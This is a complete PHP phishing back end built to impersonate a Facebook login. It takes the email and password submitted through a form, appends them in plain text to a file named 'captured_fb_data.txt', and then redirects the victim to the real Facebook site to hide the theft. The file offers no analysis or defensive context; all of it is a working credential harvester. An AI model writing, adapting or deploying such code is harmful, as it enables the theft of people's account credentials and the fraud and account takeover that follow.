<?php
// Get email and password from the form
$email = $_POST['email'];
$password = $_POST['password'];

// Save data to a file in the same directory
$file = fopen("captured_fb_data.txt", "a");
fwrite($file, "Email: " . $email . " | Password: " . $password . "\n");
fclose($file);

// Redirect to the real Facebook login page
header("Location: https://www.facebook.com");
exit();
?>
